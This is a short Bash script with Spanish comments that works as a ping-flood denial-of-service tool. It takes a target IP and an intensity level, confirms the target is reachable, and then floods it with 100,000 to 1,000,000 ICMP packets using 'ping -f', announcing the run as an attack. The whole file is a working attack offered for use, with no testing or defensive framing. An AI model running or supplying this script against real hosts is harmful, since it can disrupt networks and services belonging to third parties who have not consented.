#!/bin/bash

# Verificar que se pase la IP de destino
if [ $# -lt 2 ]; then
    echo "Uso: $0 <IP objetivo> -n <nivel>"
    echo "Niveles: 1 = Bajo, 2 = Medio, 3 = Alto"
    exit 1
fi

# Dirección IP del objetivo
TARGET=$1

# Leer el nivel de intensidad
LEVEL=$3

# Comprobación de conectividad
ping -c 1 $TARGET > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "No se pudo alcanzar el objetivo: $TARGET"
    exit 2
fi

# Definir el número de pings según el nivel
case $LEVEL in
    1)
        PING_COUNT=100000  # Nivel Bajo
        ;;
    2)
        PING_COUNT=500000  # Nivel Medio
        ;;
    3)
        PING_COUNT=1000000  # Nivel Alto
        ;;
    *)
        echo "Nivel no válido. Usa 1, 2 o 3."
        exit 3
        ;;
esac

# Iniciar el ataque de Ping Flood con el nivel seleccionado
echo "Iniciando ataque de Ping Flood hacia $TARGET con $PING_COUNT paquetes..."
ping -f -c $PING_COUNT $TARGET

echo "Ataque completo."
